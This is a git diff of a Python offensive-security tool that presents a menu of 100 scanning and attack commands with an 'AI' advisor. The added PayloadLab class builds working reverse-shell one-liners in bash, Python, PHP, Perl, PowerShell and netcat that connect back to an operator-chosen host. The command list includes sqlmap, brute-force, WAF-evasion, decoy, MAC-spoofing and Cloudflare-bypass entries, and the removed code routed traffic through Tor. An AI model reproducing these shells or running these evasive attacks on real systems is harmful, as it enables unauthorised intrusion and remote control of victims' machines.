@@ -3,245 +3,368 @@ import time
 import sys
 import subprocess
 import re
+import json
+import socket
+from datetime import datetime
 
-# Colors
+# --- COLORS (ABDUL MATEEN SIGNATURE) ---
 R, G, Y, C, M, W, RESET = '\033[91m', '\033[92m', '\033[93m', '\033[96m', '\033[95m', '\033[97m', '\033[0m'
 
-# --- ABDUL MATEEN'S AI BRAIN ---
+# --- THE BRAIN: ADVANCED CYBER AI ENGINE ---
 class CyberAI:
     def __init__(self):
-        # Error patterns aur unke intelligent solutions
         self.error_db = {
-            r"403 Forbidden|Access Denied": ("IP_BLOCKED", "Target ne aapka IP block kiya hai. IP rotate ho chuka hai, ab Stealth mode try karein."),
-            r"406 Not Acceptable|WAF|Mod_Security|Cloudflare": ("WAF_DETECTED", "WAF Detection! Firewall ne packets drop kiye hain. Fragmentation (-f) ya Decoy (-D) use karein."),
-            r"Connection timed out|0 hosts up": ("HOST_DOWN", "Target unreachable hai ya highly secured firewall use kar raha hai."),
-            r"429 Too Many Requests": ("RATE_LIMITED", "Scanning speed bohot fast hai. Timing T2 ya T1 use karein."),
-            r"401 Unauthorized": ("AUTH_REQUIRED", "Authentication bypass scripts ki zaroorat hai.")
+            r"403 Forbidden|Access Denied": ("IP_BLOCKED", "Target firewall has filtered your IP. Switch to MTU fragmentation mode."),
+            r"406 Not Acceptable|WAF|Cloudflare|Mod_Security": ("WAF_DETECTED", "WAF presence confirmed. Use Decoy (-D) or packet padding manipulation."),
+            r"Connection timed out|0 hosts up": ("HOST_DOWN", "Target host is silent, dropping packets, or highly protected."),
+            r"429 Too Many Requests": ("RATE_LIMITED", "Scanning speed is too fast and triggering rate limits. Switch to T1/T2 timing."),
+            r"401 Unauthorized": ("AUTH_REQUIRED", "Authentication layer detected. Basic probing requires brute-force/bypass scripts.")
+        }
+        
+        self.service_logic = {
+            "21": ("021", "FTP Open: Testing for anonymous access and known vsftpd backdoor signatures."),
+            "22": ("012", "SSH Open: Recommending automated credential brute-force audit framework."),
+            "23": ("009", "Telnet Open: Unencrypted protocol detected. Suggesting packet sniffing vectors."),
+            "25": ("068", "SMTP Open: Probing for user enumeration techniques and open relay vulnerabilities."),
+            "53": ("019", "DNS Open: Attempting zone transfer (AXFR) sequences and subdomain discovery."),
+            "80": ("031", "HTTP Web Server: Launching advanced directory fuzzing and vulnerability scanning."),
+            "110": ("011", "POP3 Open: Auditing for cleartext command execution and password leaks."),
+            "139": ("017", "NetBIOS Open: Mapping target network shares and domain configurations."),
+            "443": ("054", "HTTPS Server: Initiating complete SSL/TLS cipher audit and certificate chain analysis."),
+            "445": ("017", "SMB Open: Verifying critical remote code execution flaws like EternalBlue and SMBGhost."),
+            "1433": ("036", "MSSQL Server: Probing for default administrative privileges and SQL injection vectors."),
+            "3306": ("020", "MySQL Database: Running automated metadata extraction and root access verification."),
+            "3389": ("022", "RDP Protocol: Checking for remote execution flaws like BlueKeep and encryption levels."),
+            "5432": ("035", "PostgreSQL Database: Testing for loose authentication trust policies."),
+            "8080": ("039", "Alternative HTTP: Inspecting for internal application consoles or deployment managers.")
         }
 
     def analyze_output(self, output):
-        for pattern, (error_type, advice) in self.error_db.items():
+        for pattern, (err, advice) in self.error_db.items():
             if re.search(pattern, output, re.IGNORECASE):
-                return error_type, advice
+                return err, advice
         return None, None
 
-mateen_ai = CyberAI()
+    def get_recommendations(self, nmap_output):
+        suggestions = []
+        for port, (cmd_num, advice) in self.service_logic.items():
+            if f"{port}/tcp" in nmap_output:
+                suggestions.append(f"{G}[AI SUGGESTION] Port {port} is OPEN: {advice} Recommendation: Execute CMD [{cmd_num}].{RESET}")
+        return suggestions
 
-def rotate_ip():
-    print(f"{Y}[*] AI ACTION: Rotating IP via Tor for Anonymity...{RESET}")
-    os.system("sudo service tor restart > /dev/null 2>&1")
-    time.sleep(1)
-    print(f"{G}[+] IP Changed. New identity established.{RESET}")
+# --- ADVANCED FRAMEWORK MODULE 1: INTERACTIVE PAYLOAD GENERATOR ---
+class PayloadLab:
+    def __init__(self, lhost, lport):
+        self.lhost = lhost
+        self.lport = lport
 
-def animation():
-    os.system('clear')
-    name = "   A B D U L   M A T E E N   -   1 0 0   S C A N N I N G   C O M M A N D S   [AI EDITION]"
-    for char in name:
-        sys.stdout.write(f"{G}{char}{RESET}")
-        sys.stdout.flush()
-        time.sleep(0.01)
-    print(f"\n{M}" + "="*95 + f"{RESET}")
+    def get_bash(self):
+        return f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
 
-# --- 100 COMMANDS DATABASE (FULL RESTORED) ---
-cmd_list = {
-    "1": ("nmap -sS -Pn {t}", "Stealth SYN Scan: Disables ping discovery and uses half-open connections."),
-    "2": ("nmap -sV --version-intensity 9 {t}", "Advanced Version Detection: High intensity service identification."),
-    "3": ("nmap -O --osscan-guess {t}", "OS Fingerprinting: Aggressive OS stack analysis."),
-    "4": ("nmap -f -mtu 8 {t}", "Packet Fragmentation: Splits headers to slip past firewalls/IDS."),
-    "5": ("nmap -D RND:20 {t}", "Decoy Scanning: Masks your real IP with 20 random decoys."),
-    "6": ("nmap --data-length 128 {t}", "Packet Padding: Adds random data to bypass size-based filters."),
-    "7": ("nmap --source-port 53 {t}", "Source Port Spoofing: Mimics DNS traffic to bypass firewall rules."),
-    "8": ("nmap --badsum {t}", "Checksum Manipulation: Identifies active IDS systems."),
-    "9": ("nmap --script vuln {t}", "Vulnerability Engine: Checks for critical known vulnerabilities."),
-    "10": ("nmap -p- -T4 {t}", "Full Port Coverage: Scans all 65,535 ports at high speed."),
-    "11": ("nmap --script auth {t}", "Authentication Probe: Targets services with no/default passwords."),
-    "12": ("nmap --script brute {t}", "Brute Force Discovery: Auto-guesses common credentials."),
-    "13": ("nmap --script default,safe {t}", "Safe Reconnaissance: Gathers info without crashing services."),
-    "14": ("nmap --spoof-mac Apple {t}", "MAC Address Spoofing: Appears as an Apple device."),
-    "15": ("nmap -sU -p 53,67,123,161 {t}", "UDP Service Scan: Targets DNS, DHCP, SNMP."),
-    "16": ("nmap --script http-enum {t}", "Web Directory Enumeration: Finds config and backup folders."),
-    "17": ("nmap --script smb-vuln* {t}", "SMB Exploit Check: Checks for EternalBlue/SMBGhost."),
-    "18": ("nmap --script ssl-enum-ciphers {t}", "SSL/TLS Audit: Finds weak encryption ciphers."),
-    "19": ("nmap --script dns-brute {t}", "DNS Subdomain Discovery: Brute-forces hidden subdomains."),
-    "20": ("nmap --script mysql-info {t}", "MySQL Recon: Extracts version and user info."),
-    "21": ("nmap --script ftp-anon {t}", "FTP Anonymous Check: Checks for unauthorized logins."),
-    "22": ("nmap --script rdp-enum-encryption {t}", "RDP Analysis: Audits Remote Desktop encryption."),
-    "23": ("nmap -T1 -sS {t}", "Paranoid Mode: Extreme delays to stay undetected."),
-    "24": ("nmap --script http-waf-detect {t}", "WAF Fingerprinting: Detects Cloudflare/Akamai protection."),
-    "25": ("nmap --script http-robots.txt {t}", "Robots Scraper: Finds hidden paths from robots.txt."),
-    "26": ("nmap --script snmp-brute {t}", "SNMP String Guessing: Finds public/private strings."),
-    "27": ("nmap --script vnc-info {t}", "VNC Access Check: Scans for open remote desktops."),
-    "28": ("nmap --script whois-domain {t}", "Whois Intelligence: Queries WHOIS for admin data."),
-    "29": ("nmap --script http-methods {t}", "HTTP Verb Audit: Checks for PUT, DELETE, TRACE."),
-    "30": ("nmap -sT -Pn {t}", "Full TCP Connect: Accurate but more visible port verification."),
-    "31": ("nikto -h {t}", "Web Server Vulnerability Scan: Audits 6700+ dangerous files."),
-    "32": ("nikto -h {t} -Tuning 4", "SQL Injection Tuning: Focuses specifically on SQLi."),
-    "33": ("nikto -h {t} -evasion 1", "WAF Evasion: Random URI encoding."),
-    "34": ("sqlmap -u {t} --batch --crawl=2", "Automated SQLi Discovery: Crawls and tests forms."),
-    "35": ("sqlmap -u {t} --dbs", "Database Enumeration: Lists all databases."),
-    "36": ("sqlmap -u {t} --level=5 --risk=3", "Maximum SQLi Aggression: All injection methods."),
-    "37": ("ghauri -u {t} --batch --dbs", "Fast SQLi Recon: Advanced database detection."),
-    "38": ("wafw00f {t} -a", "Aggressive WAF Detection: Identifies WAF type."),
-    "39": ("whatweb -a 3 {t}", "Technology Profiling: Finds CMS and plugins."),
-    "40": ("dirsearch -u {t} -e php,txt,zip,conf,sql,bak", "Hidden File Hunt: Searches for backups."),
-    "41": ("ffuf -u {t}/FUZZ -w list.txt -mc 200", "High-Speed Fuzzing: Finds hidden directories."),
-    "42": ("gobuster dir -u {t} -w list.txt -t 50", "Multi-Threaded Brute: Rapid folder scanning."),
-    "43": ("arjun -u {t} -m GET", "Hidden Parameter Discovery: Finds undocumented params."),
-    "44": ("paramspider -d {t} --level high", "Parameter Mining: Scrapes Wayback archives."),
-    "45": ("xsstrike -u {t} --crawl", "XSS Warfare: Advanced XSS engine."),
-    "46": ("wpscan --url {t} --enumerate vp,vt", "WordPress Audit: Plugin/Theme vulnerabilities."),
-    "47": ("joomscan -u {t}", "Joomla Vulnerability Scan: Joomla-specific audit."),
-    "48": ("droopescan scan drupal -u {t}", "Drupal Analysis: Scans for Drupalgeddon."),
-    "49": ("commix --url {t} --batch", "Command Injection Scanner: RCE vulnerability check."),
-    "50": ("subfinder -d {t} -silent", "Subdomain Recon: Uses multiple APIs."),
-    "51": ("amass enum -d {t}", "Active Domain Mapping: Deep DNS enumeration."),
-    "52": ("assetfinder --subs-only {t}", "Asset Extraction: Scrapes transparency logs."),
-    "53": ("sublist3r -d {t} -e google,bing,yahoo", "Search Engine Recon: Scrapes subdomains."),
-    "54": ("sslscan --show-certificate {t}", "SSL/TLS Security Audit: Cert expiration and POODLE."),
-    "55": ("photon -u {t} -l 3", "Data Crawling: Extracts emails and profiles."),
-    "56": ("theharvester -d {t} -b all", "OSINT Data Collection: Harvests emails and names."),
-    "57": ("dnsrecon -d {t} -t axfr", "DNS Zone Transfer: Downloads entire DNS records."),
-    "58": ("cloudflair -d {t}", "Cloudflare Bypass: Finds real origin IP."),
-    "59": ("uniscan -u {t} -qw", "LFI/RFI/RCE Scanner: Web file inclusion audit."),
-    "60": ("davtest -url {t}", "WebDAV Exploit Check: Tests unauthorized uploads."),
-    "61": ("nmap -sS -f --mtu 16 --data-length 100 {t}", "Ultimate Stealth Suite: Maximum evasion."),
-    "62": ("nmap --script http-shellshock {t}", "Shellshock Check: Probes for Bash vulnerability."),
-    "63": ("nmap --script http-git {t}", "Exposed Git Repository: Finds leaked source code."),
-    "64": ("nmap --script http-internal-ip-disclosure {t}", "Internal IP Disclosure: Forces IP leak."),
-    "65": ("nmap --script http-backup-finder {t}", "Sensitive Backup Discovery: Auto-search."),
-    "66": ("nmap --script http-wordpress-enum {t}", "WP User Discovery: Enumerate users."),
-    "67": ("nmap --script snmp-sysdescr {t}", "SNMP Info Leak: Extract system info."),
-    "68": ("nmap --script smtp-commands {t}", "SMTP Audit: Checks user enumeration commands."),
-    "69": ("nmap --script rdp-vuln-ms12-020 {t}", "Legacy RDP Check: DoS vulnerability probe."),
-    "70": ("nmap --script ftp-vsftpd-backdoor {t}", "Backdoor Detection: VSFTPD 2.3.4 root access."),
-    "71": ("dirb {t} -X .php,.sql", "Classic Content Brute: Executables and dumps."),
-    "72": ("uniscan -u {t} -d", "Directory Recon: Finds config files."),
-    "73": ("clusterd -i {t}", "App Server Recon: Probes JBoss/WebLogic."),
-    "74": ("cadaver {t}", "WebDAV Shell Access: Interactive file management."),
-    "75": ("fierce --domain {t}", "Recursive DNS Discovery: Non-contiguous scanner."),
-    "76": ("hping3 -S -p 80 -c 1 {t}", "Custom TCP Probe: Tests latency and FW."),
-    "77": ("fping -g {t}", "Network Range Ping: Finds live hosts fast."),
-    "78": ("netdiscover -r {t}", "ARP Discovery: Maps local network."),
-    "79": ("masscan -p1-1000 {t} --rate=1000", "Hyper-Fast Port Scan: 1000 pps."),
-    "80": ("webtech -u {t}", "Tech Stack Discovery: Lists libraries/frameworks."),
-    "81": ("crlfsuite -u {t}", "CRLF Injection Scanner: Session hijacking audit."),
-    "82": ("dalfox url {t}", "Modern XSS Fuzzer: DOM-based analysis."),
-    "83": ("gau {t} | grep '.js'", "JS File Mining: Finds hidden endpoints/keys."),
-    "84": ("waybackurls {t} | grep '.php'", "Wayback PHP Hunter: Recovers old PHP URLs."),
-    "85": ("shodan host {t}", "Shodan Intelligence: Queries indexed vulnerabilities."),
-    "86": ("recon-ng", "Full Recon Framework: Modular OSINT shell."),
-    "87": ("sslscan --tlsall {t}", "Complete TLS Audit: Tests all versions."),
-    "88": ("smbmap -H {t}", "SMB Share Permissions: Maps Read/Write access."),
-    "89": ("enum4linux {t}", "Deep Windows Recon: Extract users/shares."),
-    "90": ("nmap -sV -sC -p 445 {t}", "SMB Safe Scripting: Safe Windows info gathering."),
-    "91": ("nmap --script broadcast-dns-service-discovery {t}", "mDNS Discovery: Apple/Linux devices."),
-    "92": ("nmap --script http-svn-info {t}", "SVN Metadata Leak: Finds dev history."),
-    "93": ("nmap --script http-headers {t}", "Security Header Audit: Checks HSTS/CSP."),
-    "94": ("nmap --script banner {t}", "Service Banner Grab: Raw version extraction."),
-    "95": ("nmap -Pn -sS -T4 --open {t}", "Fast Active Recon: Only open ports."),
-    "96": ("nmap --script dns-brute --dns-brute.threads 10 {t}", "High-Thread DNS Brute."),
-    "97": ("nmap --script http-vlc-streamer-info {t}", "VLC Recon: Finds open video feeds."),
-    "98": ("nmap --script memcached-info {t}", "Memcached Leak: Checks for plain text data."),
-    "99": ("nmap --script redis-info {t}", "Redis Recon: Checks for password-less access."),
-    "100": ("nmap -p- --script vuln,safe,discovery {t}", "ABDUL MATEEN'S FINAL BOSS MODE: Deep Discovery."),
-}
+    def get_python(self):
+        return f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.lhost}\",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
 
-def run_with_ai(final_cmd, target, detail, choice):
-    rotate_ip()
-    print(f"\n{M}" + "-"*95)
-    print(f"{G}RECON: {W}{detail}{RESET}")
-    print(f"{Y}AI ENGINE: Monitoring for blocks and WAF...{RESET}")
-    print(f"{M}" + "-"*95 + f"\n")
+    def get_php(self):
+        return f"php -r '$sock=fsockopen(\"{self.lhost}\",{self.lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 
-    # Command Execution with live monitoring
-    process = subprocess.Popen(
-        f"proxychains4 {final_cmd}",
-        shell=True,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT,
-        text=True
-    )
+    def get_perl(self):
+        return f"perl -e 'use Socket;$i=\"{self.lhost}\";$p={self.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
 
-    full_output = ""
-    for line in process.stdout:
-        print(line, end="")
-        full_output += line
-    
-    process.wait()
+    def get_powershell(self):
+        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{self.lhost}\",{self.lport});"
 
-    # AI Brain analyzing the result
-    err_type, advice = mateen_ai.analyze_output(full_output)
-    
-    if err_type:
-        print(f"\n{R}[!!!] AI DETECTED {err_type}: {advice}{RESET}")
-        if err_type == "IP_BLOCKED":
-            print(f"{C}[REMEDY] Automated rotation successful. Re-run scan or use Command 004/005.{RESET}")
-    else:
-        print(f"\n{G}[+] Scan completed. No critical AI flags triggered.{RESET}")
+    def get_nc(self):
+        return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.lhost} {self.lport} >/tmp/f"
 
-def main():
-    if os.geteuid() != 0:
-        print(f"{R}[!] ERROR: ROOT privilege required! (sudo python3 filename.py){RESET}")
-        sys.exit()
+# --- ADVANCED FRAMEWORK MODULE 2: WEB TITAN AUDITOR ---
+class WebTitan:
+    def __init__(self, target):
+        self.target = target
 
-    animation()
-    target = input(f"\n{W}ENTER TARGET (URL/IP): {RESET}").strip()
-    if not target: return
-
-    while True:
-        animation()
-        print(f"{C}TARGET: {target} | AI SECURITY: ACTIVE{RESET}")
-        print(f"{Y}SELECT COMMAND (001-100) | '0' to Exit{RESET}\n")
-
-        # Compact Grid
-        for i in range(1, 101):
-            key = str(i)
-            print(f"[{G}{key.zfill(3)}{RESET}]", end="  ")
-            if i % 10 == 0: print()
-
-        choice = input(f"\n\n{M}[ABDUL-MATEEN@AI-RECON]# {RESET}").strip()
-
-        if choice == '0' or choice == '000':
-            print(f"{G}Exiting... Respect the Creed, Abdul Mateen!{RESET}")
-            break
+    def run_recon(self):
+        print(f"\n{C}[*] Triggering Automated Web Technology Profiling...{RESET}")
+        os.system(f"whatweb -a 3 {self.target}")
         
-        if choice in cmd_list:
-            cmd_template, detail = cmd_list[choice]
-            final_cmd = cmd_template.replace("{t}", target)
-            run_with_ai(final_cmd, target, detail, choice)
-            input(f"\n{Y}Press Enter to return to Menu...{RESET}")
+    def run_waf_check(self):
+        print(f"\n{C}[*] Probing Web Application Firewall Infrastructure...{RESET}")
+        os.system(f"wafw00f {self.target}")
+
+    def run_directories(self):
+        print(f"\n{C}[*] Starting Dictionary-Based Path Discovery...{RESET}")
+        os.system(f"dirb http://{self.target} -f")
+
+    def run_vulnerabilities(self):
+        print(f"\n{C}[*] Initiating Full-Scale Nikto Core Scanning...{RESET}")
+        os.system(f"nikto -h {self.target} -Tuning 1234589")
+
+# --- ADVANCED FRAMEWORK MODULE 3: AUTOMATED REPORT EXTRACTOR ---
+class ReportManager:
+    def __init__(self, target):
+        self.target = target
+        self.filename = f"titan_report_{target.replace('.', '_')}.json"
+        self.log_file = f"titan_history_{target.replace('.', '_')}.txt"
+        self.report_structure = {"target_host": target, "generated_at": str(datetime.now()), "vulnerability_records": []}
+
+    def append_scan_record(self, execution_cmd, raw_output):
+        self.report_structure["vulnerability_records"].append({
+            "timestamp": str(datetime.now()),
+            "executed_command": execution_cmd,
+            "data_summary": raw_output[:1000]
+        })
+        with open(self.log_file, "a") as txt_f:
+            txt_f.write(f"\n--- SCAN TIME: {datetime.now()} ---\nCMD: {execution_cmd}\nOUTPUT:\n{raw_output[:500]}\n")
+
+    def write_json_to_disk(self):
+        with open(self.filename, 'w') as json_f:
+            json.dump(self.report_structure, json_f, indent=4)
+        print(f"{G}[+] Structure saved to JSON Database: {self.filename}{RESET}")
+        print(f"{G}[+] Full log logs pushed to Text History: {self.log_file}{RESET}")
+
+# --- THE 100 COMMANDS MONOLITHIC DATABASE ---
+cmd_list = {
+    "1": ("nmap -sS -Pn {t}", "Stealth SYN Scan: Executes half-open connection probing without completing handshakes."),
+    "2": ("nmap -sV --version-intensity 9 {t}", "Advanced Version Detection: Aggressive probe intensity for service verification."),
+    "3": ("nmap -O --osscan-guess {t}", "OS Fingerprinting: Forces TCP/IP stack analysis to deduce remote operating system flavor."),
+    "4": ("nmap -f -mtu 8 {t}", "Packet Fragmentation: Splits header sectors into 8-byte fragments to trick basic firewalls."),
+    "5": ("nmap -D RND:20 {t}", "Decoy Scanning: Blends the genuine scanning IP address within 20 randomized source decoys."),
+    "6": ("nmap --data-length 128 {t}", "Packet Padding: appends arbitrary data to packets to alter common structural patterns."),
+    "7": ("nmap --source-port 53 {t}", "Source Port Spoofing: Alters outgoing connection port to 53 to simulate standard DNS replies."),
+    "8": ("nmap --badsum {t}", "Checksum Manipulation: Transmits invalid checksum signatures to identify defensive stateful monitors."),
+    "9": ("nmap --script vuln {t}", "Vulnerability Evaluation: Invokes the Nmap Scripting Engine to detect critical public CVEs."),
+    "10": ("nmap -p- -T4 {t}", "Full Port Coverage: Evaluates all 65,535 possible communication lines at high acceleration speeds."),
+    "11": ("nmap --script auth {t}", "Authentication Probe: Automatically checks for unsecured or empty administrative accounts."),
+    "12": ("nmap --script brute {t}", "Brute Force Discovery: Runs basic dictionary guesses against common active protocols."),
+    "13": ("nmap --script default,safe {t}", "Safe Reconnaissance: Gathers comprehensive technical operational details without service disruption."),
+    "14": ("nmap --spoof-mac Apple {t}", "MAC Address Spoofing: Overrides local network card identity to resemble an official Apple node."),
+    "15": ("nmap -sU -p 53,67,123,161 {t}", "UDP Service Scan: Directly maps connection profiles of core stateless UDP applications."),
+    "16": ("nmap --script http-enum {t}", "Web Directory Enumeration: Probes web applications for known exposed backup paths."),
+    "17": ("nmap --script smb-vuln* {t}", "SMB Exploit Verification: Searches for critical high-impact network vulnerabilities like EternalBlue."),
+    "18": ("nmap --script ssl-enum-ciphers {t}", "SSL/TLS Cipher Audit: Collects cipher suites to verify weak protocol execution configurations."),
+    "19": ("nmap --script dns-brute {t}", "DNS Subdomain Discovery: Performs high-speed namespace dictionary guessing loops."),
+    "20": ("nmap --script mysql-info {t}", "MySQL Reconnaissance: Extractions operational versions and remote system privileges."),
+    "21": ("nmap --script ftp-anon {t}", "FTP Anonymous Validation: Tests whether target allows password-less file access entry points."),
+    "22": ("nmap --script rdp-enum-encryption {t}", "RDP Analysis: Discovers Remote Desktop security configuration and protocol dependencies."),
+    "23": ("nmap -T1 -sS {t}", "Paranoid Stealth Scanning: Injects extreme microsecond gaps to render scans invisible to IDSs."),
+    "24": ("nmap --script http-waf-detect {t}", "WAF Fingerprinting: Identifies protective firewalls like Cloudflare or ModSecurity."),
+    "25": ("nmap --script http-robots.txt {t}", "Robots Scraper: Extracts directives and restricted paths hidden inside configuration text files."),
+    "26": ("nmap --script snmp-brute {t}", "SNMP String Guessing: Runs automated common word verification against SNMP endpoints."),
+    "27": ("nmap --script vnc-info {t}", "VNC Access Verification: Assesses exposed remote systems utilizing virtualization desktop layouts."),
+    "28": ("nmap --script whois-domain {t}", "Whois Intelligence Mining: References structural ownership records directly via public databases."),
+    "29": ("nmap --script http-methods {t}", "HTTP Verb Audit: Validates if unsafe methods like PUT, DELETE, or TRACE are active."),
+    "30": ("nmap -sT -Pn {t}", "Full TCP Connect Scan: Completes standard 3-way handshakes for maximum accuracy tracking."),
+    "31": ("nikto -h {t}", "Web Server Audit: Inspects standard web deployments for thousands of outdated configuration items."),
+    "32": ("nikto -h {t} -Tuning 4", "SQL Injection Tuning: Directs the vulnerability scanning system to focus strictly on injection forms."),
+    "33": ("nikto -h {t} -evasion 1", "WAF Evasion Logic: Encodes baseline payload parameters using basic randomized URI conversions."),
+    "34": ("sqlmap -u {t} --batch --crawl=2", "Automated SQLi Discovery: Automatically navigates local interfaces seeking entry parameters."),
+    "35": ("sqlmap -u {t} --dbs", "Database Schema Enumeration: Extracts visible structural catalog terms from the endpoint."),
+    "36": ("sqlmap -u {t} --level=5 --risk=3", "Maximum SQLi Aggression: Executes comprehensive data payload mutations for hard targets."),
+    "37": ("ghauri -u {t} --batch --dbs", "Fast SQLi Recon: Runs highly-optimized database structural extraction workflows."),
+    "38": ("wafw00f {t} -a", "Aggressive WAF Identification: Profiles underlying protective proxy infrastructure styles."),
+    "39": ("whatweb -a 3 {t}", "Technology Profiling: Aggressively checks software application frameworks and active library blocks."),
+    "40": ("dirsearch -u {t} -e php,txt,zip,conf,sql,bak", "Hidden File Hunting: Discovers common compressed archives on target web servers."),
+    "41": ("ffuf -u {t}/FUZZ -w list.txt -mc 200", "High-Speed Fuzzing: Uses wordlists to brute-force web application input structures."),
+    "42": ("gobuster dir -u {t} -w list.txt -t 50", "Multi-Threaded Brute-Force: Executes concurrent path evaluation threads at accelerated speeds."),
+    "43": ("arjun -u {t} -m GET", "Hidden Parameter Discovery: Isolates undocumented variables within web submission parameters."),
+    "44": ("paramspider -d {t} --level high", "Parameter Mining: Harvests historic parameters compiled from long-term public internet archives."),
+    "45": ("xsstrike -u {t} --crawl", "XSS Warfare: Evaluates user reflection parameters with deep contextual checking automation."),
+    "46": ("wpscan --url {t} --enumerate vp,vt", "WordPress Audit: Discovers vulnerable plugins or theme elements on target blogs."),
+    "47": ("joomscan -u {t}", "Joomla Vulnerability Scan: Executes environment auditing specific to Joomla installations."),
+    "48": ("droopescan scan drupal -u {t}", "Drupal Analysis: Looks for outdated module states and core execution anomalies."),
+    "49": ("commix --url {t} --batch", "Command Injection Scanner: Automates OS command injection payload delivery checks."),
+    "50": ("subfinder -d {t} -silent", "Subdomain Reconnaissance: Queries multiple cloud engines for structural address lists."),
+    "51": ("amass enum -d {t}", "Active Domain Mapping: Gathers infrastructure asset connections through complex DNS tracking."),
+    "52": ("assetfinder --subs-only {t}", "Asset Extraction: Compiles subdomain data directly from historic certificate logs."),
+    "53": ("sublist3r -d {t} -e google,bing,yahoo", "Search Engine Recon: Scrapes search indices for forgotten subdomain references."),
+    "54": ("sslscan --show-certificate {t}", "SSL/TLS Security Audit: Evaluates outdated protocols like POODLE and Heartbleed vulnerabilities."),
+    "55": ("photon -u {t} -l 3", "Data Crawling: Recursively parses application files to pull emails, files, and endpoints."),
+    "56": ("theharvester -d {t} -b all", "OSINT Data Collection: Harvests names, emails, and linked hosts from public indexes."),
+    "57": ("dnsrecon -d {t} -t axfr", "DNS Zone Transfer: Attempts full database duplication routines from target name servers."),
+    "58": ("cloudflair -d {t}", "Cloudflare Bypass: Attempts to map genuine source coordinates using legacy database historical records."),
+    "59": ("uniscan -u {t} -qw", "Web LFI/RFI/RCE Scanner: Evaluates path manipulation bugs within application code lines."),
+    "60": ("davtest -url {t}", "WebDAV Exploit Verification: Attempts file uploads to check for authorization misconfigurations."),
+    "61": ("nmap -sS -f --mtu 16 --data-length 100 {t}", "Ghost Stealth Mode: Bundles fragmentation, specific size offsets, and data padding."),
+    "62": ("nmap --script http-shellshock {t}", "Shellshock Check: Probes legacy CGI handling scripts for systemic environmental vulnerability."),
+    "63": ("nmap --script http-git {t}", "Exposed Git Repository Check: Checks for unsecure source control folders exposed on web assets."),
+    "64": ("nmap --script http-internal-ip-disclosure {t}", "Internal IP Leak Check: Forces web proxies to reveal system address configurations."),
+    "65": ("nmap --script http-backup-finder {t}", "Sensitive Backup Discovery: Checks for forgotten configuration copies inside production roots."),
+    "66": ("nmap --script http-wordpress-enum {t}", "WordPress User Discovery: Maps valid author identities using default endpoint paths."),
+    "67": ("nmap --script snmp-sysdescr {t}", "SNMP Information Leak: Pulls system specifications via unsecured open public strings."),
+    "68": ("nmap --script smtp-commands {t}", "SMTP Command Capability Audit: Evaluates internal user account tracking commands like VRFY."),
+    "69": ("nmap --script rdp-vuln-ms12-020 {t}", "Legacy RDP Check: Verifies existence of outdated memory management denial of service flaws."),
+    "70": ("nmap --script ftp-vsftpd-backdoor {t}", "FTP Backdoor Check: Looks for signature markers matching compromised historical code blocks."),
+    "71": ("dirb {t} -X .php,.sql", "Targeted Content Brute-Force: Searches specifically for raw database drops and scripts."),
+    "72": ("uniscan -u {t} -d", "Directory Recon: Looks for misconfigured text logs and configuration listings."),
+    "73": ("clusterd -i {t}", "Application Server Recon: Probes middleware technologies like JBoss or WebLogic frameworks."),
+    "74": ("cadaver {t}", "WebDAV Shell Access: Direct manual file system management interface over active folders."),
+    "75": ("fierce --domain {t}", "Recursive DNS Discovery: Looks for hidden records using specialized non-contiguous checks."),
+    "76": ("hping3 -S -p 80 -c 1 {t}", "Custom TCP Rule Probing: Manual packet generation to test firewall state rules."),
+    "77": ("fping -g {t}", "Fast Host Discovery Suite: Pings entire network blocks in parallel for rapid host scanning."),
+    "78": ("netdiscover -r {t}", "ARP Network Mapping: Actively maps standard network endpoints over raw local ARP loops."),
+    "79": ("masscan -p1-1000 {t} --rate=1000", "Hyper-Fast Port Scan: Transmits raw connection checks at extreme multi-threaded scales."),
+    "80": ("webtech -u {t}", "Tech Stack ID: Resolves framework software components through active header tracking."),
+    "81": ("crlfsuite -u {t}", "CRLF Injection Audit: Evaluates carriage return bugs capable of log tampering."),
+    "82": ("dalfox url {t}", "DOM XSS Fuzzing Engine: Evaluates dynamic input variables in runtime scripts."),
+    "83": ("gau {t} | grep '.js'", "JS Endpoint Miner: Downloads compiled JavaScript files to parse internal development keys."),
+    "84": ("waybackurls {t} | grep '.php'", "Wayback Recovery: Pulls dead historical server paths from archives to identify active lines."),
+    "85": ("shodan host {t}", "Shodan Intelligence Query: Pulls pre-scanned infrastructure threat intelligence records via external API."),
+    "86": ("recon-ng", "OSINT Framework Shell: Launches interactive workspace containing modular open intelligence assets."),
+    "87": ("sslscan --tlsall {t}", "TLS Version Audit: Forces target server to declare support for historical protocol states."),
+    "88": ("smbmap -H {t}", "SMB Share Permissions: Maps visibility states and access access modes across shares."),
+    "89": ("enum4linux {t}", "Windows Recon Extraction: Pulls system operational parameters directly via legacy RPC connections."),
+    "90": ("nmap -sV -sC -p 445 {t}", "SMB Safe Scripting: Gathers standard properties using non-destructive security checks."),
+    "91": ("nmap --script broadcast-dns-service-discovery {t}", "mDNS Local Discovery: Maps local assets via zero-configuration local broadcasts."),
+    "92": ("nmap --script http-svn-info {t}", "SVN Metadata Leak Hunter: Pulls code revision control files to recover team operations."),
+    "93": ("nmap --script http-headers {t}", "Security Header Audit: Checks for implementation failure across defensive parameters."),
+    "94": ("nmap --script banner {t}", "Banner Grabbing Suite: Pulls raw welcoming characters to extract component builds."),
+    "95": ("nmap -Pn -sS -T4 --open {t}", "Active Port Listing Only: Limits reporting visibility solely to confirmed operational channels."),
+    "96": ("nmap --script dns-brute --threads 10 {t}", "Multi-threaded DNS Search: Maximizes processing power across structural domain loops."),
+    "97": ("nmap --script http-vlc-streamer-info {t}", "IoT Media Feed Search: Identifies open unauthenticated media distribution points."),
+    "98": ("nmap --script memcached-info {t}", "Memcached Data Audit: Validates if cached memory storage buffers can be queried directly."),
